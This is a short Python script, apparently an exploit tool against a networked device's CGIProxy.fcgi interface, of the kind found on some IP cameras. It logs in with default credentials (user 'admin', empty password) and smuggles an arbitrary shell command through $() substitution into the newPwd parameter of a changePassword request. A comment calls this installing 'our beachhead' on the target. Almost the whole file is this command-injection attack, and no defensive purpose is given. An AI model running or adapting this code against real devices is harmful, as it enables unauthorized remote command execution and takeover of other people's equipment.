import requests

class Installer:
    def __init__(self):
        self.Username = 'admin'
        self.Password = ''
        return
    
    def Install(self, connection_information, credentials):
        # Installs our beachhead to the target.
        
        # Connection
        (IP, Port) = connection_information
        self.BaseURL = f'http://{IP}:{Port}/cgi-bin/CGIProxy.fcgi'

        return
    
    def Send(self, cmd, credentials):    
        fmt = "+".join(cmd.split(" "))
        return requests.get(f'{self.BaseURL}?usr={credentials["user"]}&pwd={credentials["password"]}&cmd=changePassword&usrName=steven&oldPwd=test&newPwd=$({fmt})')

def main():
    natass_installer = Installer()
    natass_installer.Install(('192.168.233.233', 88), { 'user' : 'admin', 'password' : '' })
    return

if __name__ == "__main__":
    main()

